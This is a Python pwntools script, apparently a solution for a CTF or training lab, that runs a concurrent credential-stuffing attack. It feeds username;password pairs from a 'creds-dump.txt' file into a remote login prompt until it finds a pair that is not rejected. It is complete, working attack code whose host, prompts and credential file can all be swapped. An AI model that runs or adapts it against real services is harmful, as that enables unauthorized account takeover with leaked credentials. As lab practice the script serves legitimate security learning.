from pwn import *
import asyncio
from dataclasses import dataclass
from collections.abc import Callable

# 设置架构
context.arch = "amd64"

# 日志的详细输出使用 debug，仅错误使用 error
# context.log_level = "debug"

def connect_remote(remote_host="127.0.0.1", remote_port=1337):
    """
    远程连接包装器
    """
    remote_tube = remote(host=remote_host, port=remote_port)
    return remote_tube


@dataclass
class task_item_obj:
    """任务内容"""
    task_func: Callable[..., bool]
    task_argv: list

@dataclass
class task_result_obj(object):
    """任务结果"""
    recv_byte: bytes
    is_timeout: bool

def task_data_generator_builder(file_path):
    """
    将暴破数据构造为生成器，每次调整
    """
    # 读取凭证文件为格式为 `用户名;密码`
    # 设置为生成器，以字符串格式逐行读取并格式化
    with open(file_path) as f:
        for data_block in f:

            # 格式清理
            data_username, data_password = data_block.strip().split(';')

            # 以数据对象形式传递
            task_item = task_item_obj(
                task_func = task_core, 
                task_argv = [data_username.encode(), data_password.encode()]
            )

            yield task_item

def do_task(cur_tube, data_username, data_password):
    """
    执行交互的函数，每次调整
    """
    # 测试凭据
    cur_tube.sendlineafter(delim_username, data_username)
    cur_tube.sendlineafter(delim_password, data_password)

    # 接收所有数据直到超时或 EOF
    recv_byte: bytes = cur_tube.recvrepeat(0.4)
    # 此处使用必然回显的密码字段与换行作为超时判断
    mark_end = data_password + b'\r\n'
    mark_end_index = recv_byte.find(mark_end)
    is_timeout = False
    if mark_end_index == -1:
        is_timeout = True
    elif recv_byte[mark_end_index+len(mark_end):] == b"":
        is_timeout = True

    # 返回接收的数据与连接状态
    return task_result_obj(recv_byte, is_timeout)

def check_task(recv_byte: bytes):
    """
    检查暴破结果的函数，每次调整，或合并
    """
    check_result = False
    # 若非空且非 miss，则结束任务
    if miss not in recv_byte:
        log.info(b"hit:\n")
        log.info(recv_byte)
        check_result = True
    return check_result

def task_core(data_username, data_password):
    """
    单次任务的调度函数，决定继续重试或完成，每次调整
    """
    while True:
        # 每次建立连接，执行任务后关闭
        cur_tube = connect_remote(host, port)
        task_result: task_result_obj = do_task(cur_tube, data_username, data_password)
        cur_tube.close()
        log.info([data_username, data_password])
        log.info(task_result)
        # 若未超时，则查看任务结果。否则继续尝试任务
        if not task_result.is_timeout:
            break

    task_check_result = check_task(task_result.recv_byte)
    return task_check_result

async def worker(asyncio_queue):
    """
    协程工作者，持续从协程任务队列领取并执行任务。
    - 当未收到结束标记时，调用工作调度函数
    - 当 hit 时，抛出异常
    """
    while True:
        # 即将执行任务，取出任务队列中的一个任务
        task_item: task_item_obj = await asyncio_queue.get()
        try:
            # 若收到任务结束标记
            if task_item is None:
                # 当前任务执行完成
                break

            # 执行阻塞任务，得到任务结果
            task_check_result = await asyncio.to_thread(task_item.task_func, *task_item.task_argv)

            # 若任务 hit 则抛出异常终止所有工作
            if task_check_result:
                raise RuntimeError(f""">>> hit: {task_item.task_argv}<<< """)
        finally:
            # break 与取消异常
            # 当前任务执行完成
            asyncio_queue.task_done()   

async def sender(asyncio_queue, worker_num, task_data_generator):
    """
    协程任务派发者
    - 使用迭代器派发任务到协程任务队列
    - 最后添加任务结束标记
    """
    # 遍历条目作为工作数据
    for task_data in task_data_generator:       
        # 派发工作函数与参数到工作队列
        await asyncio_queue.put(task_data)

    # 添加任务结束标记，或使用 shutdown
    for _ in range(worker_num):
        await asyncio_queue.put(None)
    
async def main(task_data_generator, queue_size=6, worker_num=6):
    """
    协程主函数，使用滑动窗口型任务派发
    - 使用 asyncio.Queue() 有界派发任务到协程任务队列
    - 使用 asyncio.TaskGroup() 有界创建协程任务组
        - 创建1个协程派发者，并传递任务迭代器，派发任务到任务队列
        - 创建一批协程工作者，持续从任务队列领取任务
    - 使用 hit 工作者抛出的异常终止任务组
    """
    # 创建协程队列
    asyncio_queue = asyncio.Queue(queue_size)

    try:
        # TaskGroup 仅取消任务组，而无法取消队列。
        # 分离任务组与队列，TaskGroup 不等待队列完成，使用任务结束标记
        async with asyncio.TaskGroup() as asyncio_TaskGroup:
            # 创建一批工作者
            worker_list = [
                asyncio_TaskGroup.create_task(worker(asyncio_queue))
                for i in range(worker_num)
            ]

            # 创建派发者
            sender_one = asyncio_TaskGroup.create_task(sender(asyncio_queue, worker_num, task_data_generator))

    except* RuntimeError as eg:
        # 接收异常组
        for e in eg.exceptions:
            log.info(e)


"""
Please enter your username & password to login.
Username: rora
rora
Password: winner1
winner1

Invalid username or password
"""

delim_username = b"Username:"
delim_password = b"Password:"
miss = b'Invalid username or password'

host, port = "chatelaine.cylabacademy.net 14208".split()

task_data_generator = task_data_generator_builder("creds-dump.txt")

# 执行主协程
asyncio.run(main(task_data_generator))
